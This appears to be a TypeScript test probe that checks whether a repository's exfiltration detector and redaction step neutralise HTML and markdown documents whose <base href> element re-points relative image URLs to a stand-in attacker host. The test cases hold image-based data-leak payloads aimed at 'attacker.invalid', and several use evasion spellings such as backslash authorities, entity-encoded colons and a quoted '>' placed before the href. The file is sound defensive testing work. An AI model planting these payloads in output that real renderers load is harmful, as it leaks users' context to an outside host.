// T52 — the `<base href>` determination (T42#F-006), measured in both directions.
//
// `<base>` fetches nothing. It re-points every RELATIVE URL in the document, so it
// falsifies the load-bearing half of the detector's rule: "the two synthetic bases
// disagree ⇒ the destination is relative ⇒ the renderer fetches it from its own
// origin ⇒ there is no cross-origin channel". This probe does not ask whether the
// detector flags the base element; it asks the only question that matters —
// **after redaction, can any destination in the document still reach the attacker
// host in a real renderer?**
//
// The renderer model here is independent of the detector: it finds the document
// base itself, applies it the way an HTML document does, and adjudicates every
// destination with the platform WHATWG `URL` against five renderer document bases.
//
// Read-only. Synthetic hosts only (`*.invalid`, `example.org`); nothing contacted.
//
// Usage: bun T52-base.ts [out.json] [detectorModulePath]
//   detectorModulePath defaults to the repository's current detector; pass a copy
//   of an older revision to measure the "before" side.

import { applyRedaction } from "../../../../src/security/redact";
import type { DetectorMatch } from "../../../../src/security/types";

const DEFAULT_DETECTOR = new URL(
  "../../../../src/security/detect/exfil.ts",
  import.meta.url,
).pathname;

const detectorPath = process.argv[3] ?? DEFAULT_DETECTOR;
const { detectExfil } = (await import(detectorPath)) as {
  detectExfil: (content: string, allowlist?: string[]) => DetectorMatch[];
};

const ATT = "attacker.invalid";
const BS = String.fromCharCode(92);

const RENDERER_BASES = [
  ["https-page", "https://client.example.org/session/page"],
  ["http-page", "http://client.example.org/session/page"],
  ["file-doc", "file:///Users/x/app/index.html"],
  ["vscode-webview", "vscode-webview://abc123/index.html"],
  ["electron-app-scheme", "app://bundle/index.html"],
] as const;

const OWN_HOSTS = new Set(["client.example.org", "abc123", "bundle", ""]);

// A renderer's character-reference decoding, deliberately independent of the
// detector's own table.
function decodeForRenderer(value: string): string {
  const named: Record<string, string> = {
    colon: ":",
    sol: "/",
    bsol: BS,
    Tab: String.fromCharCode(9),
    NewLine: String.fromCharCode(10),
    amp: "&",
  };
  return value.replace(
    /&(?:#(\d+)|#[xX]([0-9a-fA-F]+)|([a-zA-Z][a-zA-Z0-9]*));?/g,
    (raw, dec, hex, name) => {
      if (dec !== undefined || hex !== undefined) {
        const code = dec !== undefined ? parseInt(dec, 10) : parseInt(hex, 16);
        if (!Number.isInteger(code) || code <= 0 || code > 0x10ffff) return raw;
        try {
          return String.fromCodePoint(code);
        } catch {
          return raw;
        }
      }
      return named[String(name)] ?? raw;
    },
  );
}

// Split the document into start-tag extents. Written as a quote-state walk rather
// than a character class because that is the one tokenizer fact that matters here:
// a `>` inside a quoted attribute value does not end a tag, and markup written
// INSIDE such a value is text, so a renderer never sees it as an element.
function tagExtents(document: string): string[] {
  const out: string[] = [];
  let index = 0;
  while (index < document.length) {
    if (document[index] !== "<" || !/[a-zA-Z]/.test(document[index + 1] ?? "")) {
      index += 1;
      continue;
    }
    let cursor = index + 1;
    let quote: string | null = null;
    while (cursor < document.length) {
      const character = document[cursor] as string;
      if (quote !== null) {
        if (character === quote) quote = null;
      } else if (character === '"' || character === "'") {
        quote = character;
      } else if (character === ">") {
        break;
      }
      cursor += 1;
    }
    out.push(document.slice(index, Math.min(cursor + 1, document.length)));
    index = cursor + 1;
  }
  return out;
}

function attributeValue(tag: string, name: string): string | null {
  const pattern = new RegExp(
    `\\b${name}\\s*=\\s*(?:"([^"]*)"|'([^']*)'|([^\\s>]+))`,
    "i",
  );
  const match = pattern.exec(tag);
  if (!match) return null;
  return match[1] ?? match[2] ?? match[3] ?? null;
}

// The two things a renderer needs from the document: its base element's href, and
// every auto-fetched destination.
function documentBaseHref(document: string): string | null {
  for (const tag of tagExtents(document)) {
    if (!/^<base(?=[\t\n\f\r />]|$)/i.test(tag)) continue;
    const href = attributeValue(tag, "href");
    if (href !== null) return href;
  }
  return null;
}

function destinations(document: string): string[] {
  const found: string[] = [];
  for (const tag of tagExtents(document)) {
    if (!/^<im(?:age|g)(?=[\t\n\f\r />]|$)/i.test(tag)) continue;
    for (const name of ["src", "srcset"]) {
      const raw = attributeValue(tag, name);
      if (raw === null) continue;
      for (const candidate of raw.split(",")) {
        const url = candidate.trim().split(/\s+/)[0] ?? "";
        if (url) found.push(url);
      }
    }
  }
  const md = /!\[[^\]]*\]\(\s*([^)\s]+)/g;
  let m: RegExpExecArray | null;
  while ((m = md.exec(document)) !== null) {
    if (m[1]) found.push(m[1]);
  }
  return found;
}

// Every remote host this document would actually fetch, per renderer base, with
// the document's own `<base href>` applied exactly as a renderer applies it.
function remoteHosts(document: string): Record<string, string[]> {
  const baseHref = documentBaseHref(document);
  const out: Record<string, string[]> = {};
  for (const [label, rendererBase] of RENDERER_BASES) {
    let effective = rendererBase as string;
    if (baseHref) {
      try {
        effective = new URL(decodeForRenderer(baseHref), rendererBase).href;
      } catch {
        // an unresolvable base leaves the document base unchanged
      }
    }
    const hosts: string[] = [];
    for (const destination of destinations(document)) {
      try {
        const resolved = new URL(decodeForRenderer(destination), effective);
        if (resolved.protocol !== "http:" && resolved.protocol !== "https:") continue;
        const host = resolved.hostname.toLowerCase();
        if (!OWN_HOSTS.has(host)) hosts.push(host);
      } catch {
        // not resolvable in this renderer
      }
    }
    out[label] = [...new Set(hosts)];
  }
  return out;
}

type Case = {
  id: string;
  document: string;
  allowlist: string[];
  // true when the document must end up fetching NOTHING remote after redaction
  mustBeNeutralized: boolean;
  note: string;
};

const cases: Case[] = [
  {
    id: "base.repointsRelativeImage",
    document: `<base href="https://${ATT}/"><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "the whole point: the img destination is RELATIVE and the base makes it remote",
  },
  {
    id: "base.repointsMarkdownImage",
    document: `<base href="https://${ATT}/">\n\n![x](/p?x=ctx)`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "same, through the markdown image surface",
  },
  {
    id: "base.repointsSrcset",
    document: `<base href="https://${ATT}/"><img srcset="/a.png 1x, /b.png 2x">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "same, through srcset candidates",
  },
  {
    id: "base.protocolRelative",
    document: `<base href="//${ATT}/"><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "protocol-relative base",
  },
  {
    id: "base.schemeNoSlashes",
    document: `<base href="https:${ATT}/"><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "the defect-2 spelling, in the base element",
  },
  {
    id: "base.backslashAuthority",
    document: `<base href="${BS}${BS}${ATT}/"><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "backslash authority in the base element",
  },
  {
    id: "base.entityColon",
    document: `<base href="https&colon;//${ATT}/"><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "character reference in the base element",
  },
  {
    id: "base.afterTheImage",
    document: `<img src="/p?x=ctx"><base href="https://${ATT}/">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "the base written AFTER the destination it re-points",
  },
  {
    id: "base.uppercaseSingleQuoted",
    document: `<BASE HREF='https://${ATT}/'><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "case and quote spellings",
  },
  {
    id: "base.hrefBehindQuotedGt",
    document: `<base target="_blank>x" href="https://${ATT}/"><img src="/p?x=ctx">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "defect 1 and defect 4 combined: a quoted > before the href",
  },
  // ── controls: these must stay unflagged and are already neutral ─────────────
  {
    id: "ctl.relativeBase",
    document: `<base href="/docs/"><img src="/p.png">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "a base that re-points inside the reader's own origin is not a channel",
  },
  {
    id: "ctl.baseWithoutHref",
    document: `<base target="_blank"><img src="/p.png">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "no href, nothing re-pointed",
  },
  {
    id: "ctl.baseInsideAttributeValue",
    document: `<img alt="<base href=https://${ATT}/>" src="/p.png">`,
    allowlist: [],
    mustBeNeutralized: true,
    note: "markup inside a quoted value is text, not an element — must not be a finding",
  },
  {
    id: "ctl.allowlistedBase",
    document: `<base href="https://cdn.trusted.example/"><img src="/p.png">`,
    allowlist: ["trusted.example"],
    mustBeNeutralized: false,
    note: "an allowlisted base is permitted; it fetches from the allowlisted host by design",
  },
];

const rows = cases.map((c) => {
  const matches = detectExfil(c.document, c.allowlist);
  const redacted = applyRedaction(c.document, matches);
  const before = remoteHosts(c.document);
  const after = remoteHosts(redacted);
  const reachableBefore = [...new Set(Object.values(before).flat())];
  const reachableAfter = [...new Set(Object.values(after).flat())];
  return {
    id: c.id,
    note: c.note,
    matches: matches.length,
    policyIds: matches.map((m) => m.policyId),
    redacted,
    attackerReachableBeforeRedaction: reachableBefore.includes(ATT),
    attackerReachableAfterRedaction: reachableAfter.includes(ATT),
    remoteHostsAfterRedaction: reachableAfter,
    // the property under test: a document whose base makes a relative
    // destination remote must fetch nothing remote once redaction is applied
    neutralized: c.mustBeNeutralized ? reachableAfter.length === 0 : true,
    falsePositive:
      c.id.startsWith("ctl.") && !reachableBefore.includes(ATT) && matches.length > 0,
  };
});

const report = {
  detector: detectorPath,
  cases: rows.length,
  notNeutralized: rows.filter((r) => !r.neutralized).map((r) => r.id),
  falsePositives: rows.filter((r) => r.falsePositive).map((r) => r.id),
  reachableBeforeRedaction: rows
    .filter((r) => r.attackerReachableBeforeRedaction)
    .map((r) => r.id),
  reachableAfterRedaction: rows
    .filter((r) => r.attackerReachableAfterRedaction)
    .map((r) => r.id),
  rows,
};

const out = process.argv[2];
if (out) await Bun.write(out, JSON.stringify(report, null, 2));
console.log(
  JSON.stringify(
    {
      detector: report.detector,
      cases: report.cases,
      notNeutralized: report.notNeutralized,
      falsePositives: report.falsePositives,
      reachableBeforeRedaction: report.reachableBeforeRedaction,
      reachableAfterRedaction: report.reachableAfterRedaction,
    },
    null,
    2,
  ),
);
